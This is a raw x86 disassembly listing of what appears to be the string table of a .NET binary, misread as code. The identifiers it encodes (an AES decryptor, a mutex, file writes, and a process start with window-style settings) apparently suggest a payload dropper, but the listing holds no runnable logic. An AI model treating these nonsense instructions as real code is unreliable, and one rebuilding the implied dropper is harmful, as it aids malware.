  408627:	6f                   	outsl  %ds:(%esi),(%dx)
  408628:	72 00                	jb     0x40862a
  40862a:	41                   	inc    %ecx
  40862b:	45                   	inc    %ebp
  40862c:	53                   	push   %ebx
  40862d:	5f                   	pop    %edi
  40862e:	44                   	inc    %esp
  40862f:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408633:	70 74                	jo     0x4086a9
  408635:	6f                   	outsl  %ds:(%esi),(%dx)
  408636:	72 00                	jb     0x408638
  408638:	5f                   	pop    %edi
  408639:	61                   	popa
  40863a:	70 70                	jo     0x4086ac
  40863c:	4d                   	dec    %ebp
  40863d:	75 74                	jne    0x4086b3
  40863f:	65 78 00             	gs js  0x408642
  408642:	43                   	inc    %ebx
  408643:	72 65                	jb     0x4086aa
  408645:	61                   	popa
  408646:	74 65                	je     0x4086ad
  408648:	4d                   	dec    %ebp
  408649:	75 74                	jne    0x4086bf
  40864b:	65 78 00             	gs js  0x40864e
  40864e:	43                   	inc    %ebx
  40864f:	6c                   	insb   (%dx),%es:(%edi)
  408650:	6f                   	outsl  %ds:(%esi),(%dx)
  408651:	73 65                	jae    0x4086b8
  408653:	4d                   	dec    %ebp
  408654:	75 74                	jne    0x4086ca
  408656:	65 78 00             	gs js  0x408659
  408659:	4d                   	dec    %ebp
  40865a:	75 6c                	jne    0x4086c8
  40865c:	74 69                	je     0x4086c7
  40865e:	63 61 73             	arpl   %esp,0x73(%ecx)
  408661:	74 44                	je     0x4086a7
  408663:	65 6c                	gs insb (%dx),%es:(%edi)
  408665:	65 67 61             	gs addr16 popa
  408668:	74 65                	je     0x4086cf
  40866a:	00 54 61 72          	add    %dl,0x72(%ecx,%eiz,2)
  40866e:	67 65 74 4f          	addr16 gs je 0x4086c1
  408672:	62 6a 65             	bound  %ebp,0x65(%edx)
  408675:	63 74 00 54          	arpl   %esi,0x54(%eax,%eax,1)
  408679:	61                   	popa
  40867a:	72 67                	jb     0x4086e3
  40867c:	65 74 4d             	gs je  0x4086cc
  40867f:	65 74 68             	gs je  0x4086ea
  408682:	6f                   	outsl  %ds:(%esi),(%dx)
  408683:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  408687:	79 6e                	jns    0x4086f7
  408689:	63 43 61             	arpl   %eax,0x61(%ebx)
  40868c:	6c                   	insb   (%dx),%es:(%edi)
  40868d:	6c                   	insb   (%dx),%es:(%edi)
  40868e:	62 61 63             	bound  %esp,0x63(%ecx)
  408691:	6b 00 42             	imul   $0x42,(%eax),%eax
  408694:	65 67 69 6e 49 6e 76 	imul   $0x6b6f766e,%gs:0x49(%bp),%ebp
  40869b:	6f 6b 
  40869d:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4086a2:	65 67 61             	gs addr16 popa
  4086a5:	74 65                	je     0x40870c
  4086a7:	43                   	inc    %ebx
  4086a8:	61                   	popa
  4086a9:	6c                   	insb   (%dx),%es:(%edi)
  4086aa:	6c                   	insb   (%dx),%es:(%edi)
  4086ab:	62 61 63             	bound  %esp,0x63(%ecx)
  4086ae:	6b 00 44             	imul   $0x44,(%eax),%eax
  4086b1:	65 6c                	gs insb (%dx),%es:(%edi)
  4086b3:	65 67 61             	gs addr16 popa
  4086b6:	74 65                	je     0x40871d
  4086b8:	41                   	inc    %ecx
  4086b9:	73 79                	jae    0x408734
  4086bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4086bc:	63 53 74             	arpl   %edx,0x74(%ebx)
  4086bf:	61                   	popa
  4086c0:	74 65                	je     0x408727
  4086c2:	00 45 6e             	add    %al,0x6e(%ebp)
  4086c5:	64 49                	fs dec %ecx
  4086c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4086c8:	76 6f                	jbe    0x408739
  4086ca:	6b 65 00 44          	imul   $0x44,0x0(%ebp),%esp
  4086ce:	65 6c                	gs insb (%dx),%es:(%edi)
  4086d0:	65 67 61             	gs addr16 popa
  4086d3:	74 65                	je     0x40873a
  4086d5:	41                   	inc    %ecx
  4086d6:	73 79                	jae    0x408751
  4086d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4086d9:	63 52 65             	arpl   %edx,0x65(%edx)
  4086dc:	73 75                	jae    0x408753
  4086de:	6c                   	insb   (%dx),%es:(%edi)
  4086df:	74 00                	je     0x4086e1
  4086e1:	49                   	dec    %ecx
  4086e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4086e3:	76 6f                	jbe    0x408754
  4086e5:	6b 65 00 56          	imul   $0x56,0x0(%ebp),%esp
  4086e9:	61                   	popa
  4086ea:	6c                   	insb   (%dx),%es:(%edi)
  4086eb:	75 65                	jne    0x408752
  4086ed:	54                   	push   %esp
  4086ee:	79 70                	jns    0x408760
  4086f0:	65 00 63 62          	add    %ah,%gs:0x62(%ebx)
  4086f4:	53                   	push   %ebx
  4086f5:	69 7a 65 00 64 77 54 	imul   $0x54776400,0x65(%edx),%edi
  4086fc:	69 6d 65 00 45 6e 75 	imul   $0x756e4500,0x65(%ebp),%ebp
  408703:	6d                   	insl   (%dx),%es:(%edi)
  408704:	00 76 61             	add    %dh,0x61(%esi)
  408707:	6c                   	insb   (%dx),%es:(%edi)
  408708:	75 65                	jne    0x40876f
  40870a:	5f                   	pop    %edi
  40870b:	5f                   	pop    %edi
  40870c:	00 45 53             	add    %al,0x53(%ebp)
  40870f:	5f                   	pop    %edi
  408710:	43                   	inc    %ebx
  408711:	4f                   	dec    %edi
  408712:	4e                   	dec    %esi
  408713:	54                   	push   %esp
  408714:	49                   	dec    %ecx
  408715:	4e                   	dec    %esi
  408716:	55                   	push   %ebp
  408717:	4f                   	dec    %edi
  408718:	55                   	push   %ebp
  408719:	53                   	push   %ebx
  40871a:	00 45 53             	add    %al,0x53(%ebp)
  40871d:	5f                   	pop    %edi
  40871e:	44                   	inc    %esp
  40871f:	49                   	dec    %ecx
  408720:	53                   	push   %ebx
  408721:	50                   	push   %eax
  408722:	4c                   	dec    %esp
  408723:	41                   	inc    %ecx
  408724:	59                   	pop    %ecx
  408725:	5f                   	pop    %edi
  408726:	52                   	push   %edx
  408727:	45                   	inc    %ebp
  408728:	51                   	push   %ecx
  408729:	55                   	push   %ebp
  40872a:	49                   	dec    %ecx
  40872b:	52                   	push   %edx
  40872c:	45                   	inc    %ebp
  40872d:	44                   	inc    %esp
  40872e:	00 45 53             	add    %al,0x53(%ebp)
  408731:	5f                   	pop    %edi
  408732:	53                   	push   %ebx
  408733:	59                   	pop    %ecx
  408734:	53                   	push   %ebx
  408735:	54                   	push   %esp
  408736:	45                   	inc    %ebp
  408737:	4d                   	dec    %ebp
  408738:	5f                   	pop    %edi
  408739:	52                   	push   %edx
  40873a:	45                   	inc    %ebp
  40873b:	51                   	push   %ecx
  40873c:	55                   	push   %ebp
  40873d:	49                   	dec    %ecx
  40873e:	52                   	push   %edx
  40873f:	45                   	inc    %ebp
  408740:	44                   	inc    %esp
  408741:	00 53 79             	add    %dl,0x79(%ebx)
  408744:	73 74                	jae    0x4087ba
  408746:	65 6d                	gs insl (%dx),%es:(%edi)
  408748:	2e 43                	cs inc %ebx
  40874a:	6f                   	outsl  %ds:(%esi),(%dx)
  40874b:	6d                   	insl   (%dx),%es:(%edi)
  40874c:	70 6f                	jo     0x4087bd
  40874e:	6e                   	outsb  %ds:(%esi),(%dx)
  40874f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408751:	74 4d                	je     0x4087a0
  408753:	6f                   	outsl  %ds:(%esi),(%dx)
  408754:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  408757:	00 45 64             	add    %al,0x64(%ebp)
  40875a:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  408761:	77 
  408762:	73 61                	jae    0x4087c5
  408764:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408768:	74 74                	je     0x4087de
  40876a:	72 69                	jb     0x4087d5
  40876c:	62 75 74             	bound  %esi,0x74(%ebp)
  40876f:	65 00 45 64          	add    %al,%gs:0x64(%ebp)
  408773:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  40877a:	77 
  40877b:	73 61                	jae    0x4087de
  40877d:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  408781:	74 61                	je     0x4087e4
  408783:	74 65                	je     0x4087ea
  408785:	00 53 79             	add    %dl,0x79(%ebx)
  408788:	73 74                	jae    0x4087fe
  40878a:	65 6d                	gs insl (%dx),%es:(%edi)
  40878c:	2e 43                	cs inc %ebx
  40878e:	6f                   	outsl  %ds:(%esi),(%dx)
  40878f:	64 65 44             	fs gs inc %esp
  408792:	6f                   	outsl  %ds:(%esi),(%dx)
  408793:	6d                   	insl   (%dx),%es:(%edi)
  408794:	2e 43                	cs inc %ebx
  408796:	6f                   	outsl  %ds:(%esi),(%dx)
  408797:	6d                   	insl   (%dx),%es:(%edi)
  408798:	70 69                	jo     0x408803
  40879a:	6c                   	insb   (%dx),%es:(%edi)
  40879b:	65 72 00             	gs jb  0x40879e
  40879e:	47                   	inc    %edi
  40879f:	65 6e                	outsb  %gs:(%esi),(%dx)
  4087a1:	65 72 61             	gs jb  0x408805
  4087a4:	74 65                	je     0x40880b
  4087a6:	64 43                	fs inc %ebx
  4087a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a9:	64 65 41             	fs gs inc %ecx
  4087ac:	74 74                	je     0x408822
  4087ae:	72 69                	jb     0x408819
  4087b0:	62 75 74             	bound  %esi,0x74(%ebp)
  4087b3:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  4087b7:	73 74                	jae    0x40882d
  4087b9:	65 6d                	gs insl (%dx),%es:(%edi)
  4087bb:	2e 44                	cs inc %esp
  4087bd:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4087c4:	69 63 73 00 44 65 62 	imul   $0x62654400,0x73(%ebx),%esp
  4087cb:	75 67                	jne    0x408834
  4087cd:	67 65 72 48          	addr16 gs jb 0x408819
  4087d1:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  4087d8:	74 
  4087d9:	72 69                	jb     0x408844
  4087db:	62 75 74             	bound  %esi,0x74(%ebp)
  4087de:	65 00 4d 69          	add    %cl,%gs:0x69(%ebp)
  4087e2:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4087e5:	73 6f                	jae    0x408856
  4087e7:	66 74 2e             	data16 je 0x408818
  4087ea:	56                   	push   %esi
  4087eb:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4087f2:	73 69                	jae    0x40885d
  4087f4:	63 2e                	arpl   %ebp,(%esi)
  4087f6:	43                   	inc    %ebx
  4087f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4087f8:	6d                   	insl   (%dx),%es:(%edi)
  4087f9:	70 69                	jo     0x408864
  4087fb:	6c                   	insb   (%dx),%es:(%edi)
  4087fc:	65 72 53             	gs jb  0x408852
  4087ff:	65 72 76             	gs jb  0x408878
  408802:	69 63 65 73 00 53 74 	imul   $0x74530073,0x65(%ebx),%esp
  408809:	61                   	popa
  40880a:	6e                   	outsb  %ds:(%esi),(%dx)
  40880b:	64 61                	fs popa
  40880d:	72 64                	jb     0x408873
  40880f:	4d                   	dec    %ebp
  408810:	6f                   	outsl  %ds:(%esi),(%dx)
  408811:	64 75 6c             	fs jne 0x408880
  408814:	65 41                	gs inc %ecx
  408816:	74 74                	je     0x40888c
  408818:	72 69                	jb     0x408883
  40881a:	62 75 74             	bound  %esi,0x74(%ebp)
  40881d:	65 00 48 69          	add    %cl,%gs:0x69(%eax)
  408821:	64 65 4d             	fs gs dec %ebp
  408824:	6f                   	outsl  %ds:(%esi),(%dx)
  408825:	64 75 6c             	fs jne 0x408894
  408828:	65 4e                	gs dec %esi
  40882a:	61                   	popa
  40882b:	6d                   	insl   (%dx),%es:(%edi)
  40882c:	65 41                	gs inc %ecx
  40882e:	74 74                	je     0x4088a4
  408830:	72 69                	jb     0x40889b
  408832:	62 75 74             	bound  %esi,0x74(%ebp)
  408835:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  408839:	73 74                	jae    0x4088af
  40883b:	65 6d                	gs insl (%dx),%es:(%edi)
  40883d:	2e 43                	cs inc %ebx
  40883f:	6f                   	outsl  %ds:(%esi),(%dx)
  408840:	6d                   	insl   (%dx),%es:(%edi)
  408841:	70 6f                	jo     0x4088b2
  408843:	6e                   	outsb  %ds:(%esi),(%dx)
  408844:	65 6e                	outsb  %gs:(%esi),(%dx)
  408846:	74 4d                	je     0x408895
  408848:	6f                   	outsl  %ds:(%esi),(%dx)
  408849:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  40884c:	2e 44                	cs inc %esp
  40884e:	65 73 69             	gs jae 0x4088ba
  408851:	67 6e                	outsb  %ds:(%si),(%dx)
  408853:	00 48 65             	add    %cl,0x65(%eax)
  408856:	6c                   	insb   (%dx),%es:(%edi)
  408857:	70 4b                	jo     0x4088a4
  408859:	65 79 77             	gs jns 0x4088d3
  40885c:	6f                   	outsl  %ds:(%esi),(%dx)
  40885d:	72 64                	jb     0x4088c3
  40885f:	41                   	inc    %ecx
  408860:	74 74                	je     0x4088d6
  408862:	72 69                	jb     0x4088cd
  408864:	62 75 74             	bound  %esi,0x74(%ebp)
  408867:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  40886b:	73 74                	jae    0x4088e1
  40886d:	65 6d                	gs insl (%dx),%es:(%edi)
  40886f:	2e 52                	cs push %edx
  408871:	75 6e                	jne    0x4088e1
  408873:	74 69                	je     0x4088de
  408875:	6d                   	insl   (%dx),%es:(%edi)
  408876:	65 2e 43             	gs cs inc %ebx
  408879:	6f                   	outsl  %ds:(%esi),(%dx)
  40887a:	6d                   	insl   (%dx),%es:(%edi)
  40887b:	70 69                	jo     0x4088e6
  40887d:	6c                   	insb   (%dx),%es:(%edi)
  40887e:	65 72 53             	gs jb  0x4088d4
  408881:	65 72 76             	gs jb  0x4088fa
  408884:	69 63 65 73 00 52 75 	imul   $0x75520073,0x65(%ebx),%esp
  40888b:	6e                   	outsb  %ds:(%esi),(%dx)
  40888c:	74 69                	je     0x4088f7
  40888e:	6d                   	insl   (%dx),%es:(%edi)
  40888f:	65 48                	gs dec %eax
  408891:	65 6c                	gs insb (%dx),%es:(%edi)
  408893:	70 65                	jo     0x4088fa
  408895:	72 73                	jb     0x40890a
  408897:	00 47 65             	add    %al,0x65(%edi)
  40889a:	74 4f                	je     0x4088eb
  40889c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40889f:	63 74 56 61          	arpl   %esi,0x61(%esi,%edx,2)
  4088a3:	6c                   	insb   (%dx),%es:(%edi)
  4088a4:	75 65                	jne    0x40890b
  4088a6:	00 52 75             	add    %dl,0x75(%edx)
  4088a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4088aa:	74 69                	je     0x408915
  4088ac:	6d                   	insl   (%dx),%es:(%edi)
  4088ad:	65 54                	gs push %esp
  4088af:	79 70                	jns    0x408921
  4088b1:	65 48                	gs dec %eax
  4088b3:	61                   	popa
  4088b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b5:	64 6c                	fs insb (%dx),%es:(%edi)
  4088b7:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4088bb:	74 54                	je     0x408911
  4088bd:	79 70                	jns    0x40892f
  4088bf:	65 46                	gs inc %esi
  4088c1:	72 6f                	jb     0x408932
  4088c3:	6d                   	insl   (%dx),%es:(%edi)
  4088c4:	48                   	dec    %eax
  4088c5:	61                   	popa
  4088c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4088c7:	64 6c                	fs insb (%dx),%es:(%edi)
  4088c9:	65 00 41 63          	add    %al,%gs:0x63(%ecx)
  4088cd:	74 69                	je     0x408938
  4088cf:	76 61                	jbe    0x408932
  4088d1:	74 6f                	je     0x408942
  4088d3:	72 00                	jb     0x4088d5
  4088d5:	43                   	inc    %ebx
  4088d6:	72 65                	jb     0x40893d
  4088d8:	61                   	popa
  4088d9:	74 65                	je     0x408940
  4088db:	49                   	dec    %ecx
  4088dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4088dd:	73 74                	jae    0x408953
  4088df:	61                   	popa
  4088e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e1:	63 65 00             	arpl   %esp,0x0(%ebp)
  4088e4:	4d                   	dec    %ebp
  4088e5:	79 47                	jns    0x40892e
  4088e7:	72 6f                	jb     0x408958
  4088e9:	75 70                	jne    0x40895b
  4088eb:	43                   	inc    %ebx
  4088ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4088ed:	6c                   	insb   (%dx),%es:(%edi)
  4088ee:	6c                   	insb   (%dx),%es:(%edi)
  4088ef:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4088f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4088f5:	41                   	inc    %ecx
  4088f6:	74 74                	je     0x40896c
  4088f8:	72 69                	jb     0x408963
  4088fa:	62 75 74             	bound  %esi,0x74(%ebp)
  4088fd:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  408901:	73 74                	jae    0x408977
  408903:	65 6d                	gs insl (%dx),%es:(%edi)
  408905:	2e 52                	cs push %edx
  408907:	75 6e                	jne    0x408977
  408909:	74 69                	je     0x408974
  40890b:	6d                   	insl   (%dx),%es:(%edi)
  40890c:	65 2e 49             	gs cs dec %ecx
  40890f:	6e                   	outsb  %ds:(%esi),(%dx)
  408910:	74 65                	je     0x408977
  408912:	72 6f                	jb     0x408983
  408914:	70 53                	jo     0x408969
  408916:	65 72 76             	gs jb  0x40898f
  408919:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  408920:	6d                   	insl   (%dx),%es:(%edi)
  408921:	56                   	push   %esi
  408922:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408929:	74 74                	je     0x40899f
  40892b:	72 69                	jb     0x408996
  40892d:	62 75 74             	bound  %esi,0x74(%ebp)
  408930:	65 00 54 68 72       	add    %dl,%gs:0x72(%eax,%ebp,2)
  408935:	65 61                	gs popa
  408937:	64 53                	fs push %ebx
  408939:	74 61                	je     0x40899c
  40893b:	74 69                	je     0x4089a6
  40893d:	63 41 74             	arpl   %eax,0x74(%ecx)
  408940:	74 72                	je     0x4089b4
  408942:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  408949:	6f                   	outsl  %ds:(%esi),(%dx)
  40894a:	6d                   	insl   (%dx),%es:(%edi)
  40894b:	70 69                	jo     0x4089b6
  40894d:	6c                   	insb   (%dx),%es:(%edi)
  40894e:	65 72 47             	gs jb  0x408998
  408951:	65 6e                	outsb  %gs:(%esi),(%dx)
  408953:	65 72 61             	gs jb  0x4089b7
  408956:	74 65                	je     0x4089bd
  408958:	64 41                	fs inc %ecx
  40895a:	74 74                	je     0x4089d0
  40895c:	72 69                	jb     0x4089c7
  40895e:	62 75 74             	bound  %esi,0x74(%ebp)
  408961:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408965:	6e                   	outsb  %ds:(%esi),(%dx)
  408966:	76 65                	jbe    0x4089cd
  408968:	72 73                	jb     0x4089dd
  40896a:	69 6f 6e 73 00 54 6f 	imul   $0x6f540073,0x6e(%edi),%ebp
  408971:	49                   	dec    %ecx
  408972:	6e                   	outsb  %ds:(%esi),(%dx)
  408973:	74 65                	je     0x4089da
  408975:	67 65 72 00          	addr16 gs jb 0x408979
  408979:	49                   	dec    %ecx
  40897a:	6e                   	outsb  %ds:(%esi),(%dx)
  40897b:	74 65                	je     0x4089e2
  40897d:	72 61                	jb     0x4089e0
  40897f:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  408983:	6e                   	outsb  %ds:(%esi),(%dx)
  408984:	00 45 6e             	add    %al,0x6e(%ebp)
  408987:	76 69                	jbe    0x4089f2
  408989:	72 6f                	jb     0x4089fa
  40898b:	6e                   	outsb  %ds:(%esi),(%dx)
  40898c:	00 53 74             	add    %dl,0x74(%ebx)
  40898f:	72 69                	jb     0x4089fa
  408991:	6e                   	outsb  %ds:(%esi),(%dx)
  408992:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  408996:	6e                   	outsb  %ds:(%esi),(%dx)
  408997:	63 61 74             	arpl   %esp,0x74(%ecx)
  40899a:	00 56 42             	add    %dl,0x42(%esi)
  40899d:	24 41                	and    $0x41,%al
  40899f:	6e                   	outsb  %ds:(%esi),(%dx)
  4089a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4089a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4089a2:	79 6d                	jns    0x408a11
  4089a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4089a5:	75 73                	jne    0x408a1a
  4089a7:	44                   	inc    %esp
  4089a8:	65 6c                	gs insb (%dx),%es:(%edi)
  4089aa:	65 67 61             	gs addr16 popa
  4089ad:	74 65                	je     0x408a14
  4089af:	5f                   	pop    %edi
  4089b0:	30 00                	xor    %al,(%eax)
  4089b2:	5f                   	pop    %edi
  4089b3:	4c                   	dec    %esp
  4089b4:	61                   	popa
  4089b5:	6d                   	insl   (%dx),%es:(%edi)
  4089b6:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  4089ba:	5f                   	pop    %edi
  4089bb:	5f                   	pop    %edi
  4089bc:	31 00                	xor    %eax,(%eax)
  4089be:	5f                   	pop    %edi
  4089bf:	4c                   	dec    %esp
  4089c0:	61                   	popa
  4089c1:	6d                   	insl   (%dx),%es:(%edi)
  4089c2:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  4089c6:	5f                   	pop    %edi
  4089c7:	5f                   	pop    %edi
  4089c8:	32 00                	xor    (%eax),%al
  4089ca:	5f                   	pop    %edi
  4089cb:	4c                   	dec    %esp
  4089cc:	61                   	popa
  4089cd:	6d                   	insl   (%dx),%es:(%edi)
  4089ce:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  4089d2:	5f                   	pop    %edi
  4089d3:	5f                   	pop    %edi
  4089d4:	33 00                	xor    (%eax),%eax
  4089d6:	44                   	inc    %esp
  4089d7:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4089db:	67 65 72 44          	addr16 gs jb 0x408a23
  4089df:	69 73 70 6c 61 79 41 	imul   $0x4179616c,0x70(%ebx),%esi
  4089e6:	74 74                	je     0x408a5c
  4089e8:	72 69                	jb     0x408a53
  4089ea:	62 75 74             	bound  %esi,0x74(%ebp)
  4089ed:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  4089f2:	75 67                	jne    0x408a5b
  4089f4:	67 65 72 53          	addr16 gs jb 0x408a4b
  4089f8:	74 65                	je     0x408a5f
  4089fa:	70 54                	jo     0x408a50
  4089fc:	68 72 6f 75 67       	push   $0x67756f72
  408a01:	68 41 74 74 72       	push   $0x72747441
  408a06:	69 62 75 74 65 00 45 	imul   $0x45006574,0x75(%edx),%esp
  408a0d:	78 63                	js     0x408a72
  408a0f:	65 70 74             	gs jo  0x408a86
  408a12:	69 6f 6e 00 46 69 6c 	imul   $0x6c694600,0x6e(%edi),%ebp
  408a19:	65 49                	gs dec %ecx
  408a1b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a1c:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a1e:	00 50 72             	add    %dl,0x72(%eax)
  408a21:	6f                   	outsl  %ds:(%esi),(%dx)
  408a22:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a25:	73 00                	jae    0x408a27
  408a27:	50                   	push   %eax
  408a28:	72 6f                	jb     0x408a99
  408a2a:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a2d:	73 53                	jae    0x408a82
  408a2f:	74 61                	je     0x408a92
  408a31:	72 74                	jb     0x408aa7
  408a33:	49                   	dec    %ecx
  408a34:	6e                   	outsb  %ds:(%esi),(%dx)
  408a35:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a37:	00 45 6e             	add    %al,0x6e(%ebp)
  408a3a:	76 69                	jbe    0x408aa5
  408a3c:	72 6f                	jb     0x408aad
  408a3e:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3f:	6d                   	insl   (%dx),%es:(%edi)
  408a40:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a42:	74 00                	je     0x408a44
  408a44:	45                   	inc    %ebp
  408a45:	78 70                	js     0x408ab7
  408a47:	61                   	popa
  408a48:	6e                   	outsb  %ds:(%esi),(%dx)
  408a49:	64 45                	fs inc %ebp
  408a4b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a4c:	76 69                	jbe    0x408ab7
  408a4e:	72 6f                	jb     0x408abf
  408a50:	6e                   	outsb  %ds:(%esi),(%dx)
  408a51:	6d                   	insl   (%dx),%es:(%edi)
  408a52:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a54:	74 56                	je     0x408aac
  408a56:	61                   	popa
  408a57:	72 69                	jb     0x408ac2
  408a59:	61                   	popa
  408a5a:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408a5e:	00 50 72             	add    %dl,0x72(%eax)
  408a61:	6f                   	outsl  %ds:(%esi),(%dx)
  408a62:	6a 65                	push   $0x65
  408a64:	63 74 44 61          	arpl   %esi,0x61(%esp,%eax,2)
  408a68:	74 61                	je     0x408acb
  408a6a:	00 53 65             	add    %dl,0x65(%ebx)
  408a6d:	74 50                	je     0x408abf
  408a6f:	72 6f                	jb     0x408ae0
  408a71:	6a 65                	push   $0x65
  408a73:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  408a77:	72 6f                	jb     0x408ae8
  408a79:	72 00                	jb     0x408a7b
  408a7b:	45                   	inc    %ebp
  408a7c:	78 69                	js     0x408ae7
  408a7e:	74 00                	je     0x408a80
  408a80:	43                   	inc    %ebx
  408a81:	6c                   	insb   (%dx),%es:(%edi)
  408a82:	65 61                	gs popa
  408a84:	72 50                	jb     0x408ad6
  408a86:	72 6f                	jb     0x408af7
  408a88:	6a 65                	push   $0x65
  408a8a:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  408a8e:	72 6f                	jb     0x408aff
  408a90:	72 00                	jb     0x408a92
  408a92:	44                   	inc    %esp
  408a93:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  408a9a:	79 49                	jns    0x408ae5
  408a9c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a9d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a9f:	00 67 65             	add    %ah,0x65(%edi)
  408aa2:	74 5f                	je     0x408b03
  408aa4:	44                   	inc    %esp
  408aa5:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  408aac:	79 00                	jns    0x408aae
  408aae:	67 65 74 5f          	addr16 gs je 0x408b11
  408ab2:	46                   	inc    %esi
  408ab3:	75 6c                	jne    0x408b21
  408ab5:	6c                   	insb   (%dx),%es:(%edi)
  408ab6:	4e                   	dec    %esi
  408ab7:	61                   	popa
  408ab8:	6d                   	insl   (%dx),%es:(%edi)
  408ab9:	65 00 44 69 72       	add    %al,%gs:0x72(%ecx,%ebp,2)
  408abe:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  408ac3:	79 00                	jns    0x408ac5
  408ac5:	45                   	inc    %ebp
  408ac6:	78 69                	js     0x408b31
  408ac8:	73 74                	jae    0x408b3e
  408aca:	73 00                	jae    0x408acc
  408acc:	43                   	inc    %ebx
  408acd:	72 65                	jb     0x408b34
  408acf:	61                   	popa
  408ad0:	74 65                	je     0x408b37
  408ad2:	44                   	inc    %esp
  408ad3:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  408ada:	79 00                	jns    0x408adc
  408adc:	46                   	inc    %esi
  408add:	69 6c 65 00 44 65 6c 	imul   $0x656c6544,0x0(%ebp,%eiz,2),%ebp
  408ae4:	65 
  408ae5:	74 65                	je     0x408b4c
  408ae7:	00 52 65             	add    %dl,0x65(%edx)
  408aea:	61                   	popa
  408aeb:	64 41                	fs inc %ecx
  408aed:	6c                   	insb   (%dx),%es:(%edi)
  408aee:	6c                   	insb   (%dx),%es:(%edi)
  408aef:	42                   	inc    %edx
  408af0:	79 74                	jns    0x408b66
  408af2:	65 73 00             	gs jae 0x408af5
  408af5:	57                   	push   %edi
  408af6:	72 69                	jb     0x408b61
  408af8:	74 65                	je     0x408b5f
  408afa:	41                   	inc    %ecx
  408afb:	6c                   	insb   (%dx),%es:(%edi)
  408afc:	6c                   	insb   (%dx),%es:(%edi)
  408afd:	42                   	inc    %edx
  408afe:	79 74                	jns    0x408b74
  408b00:	65 73 00             	gs jae 0x408b03
  408b03:	50                   	push   %eax
  408b04:	72 6f                	jb     0x408b75
  408b06:	63 65 73             	arpl   %esp,0x73(%ebp)
  408b09:	73 57                	jae    0x408b62
  408b0b:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408b12:	79 6c                	jns    0x408b80
  408b14:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408b18:	74 5f                	je     0x408b79
  408b1a:	57                   	push   %edi
  408b1b:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408b22:	79 6c                	jns    0x408b90
  408b24:	65 00 54 6f 42       	add    %dl,%gs:0x42(%edi,%ebp,2)
  408b29:	6f                   	outsl  %ds:(%esi),(%dx)
  408b2a:	6f                   	outsl  %ds:(%esi),(%dx)
  408b2b:	6c                   	insb   (%dx),%es:(%edi)
  408b2c:	65 61                	gs popa
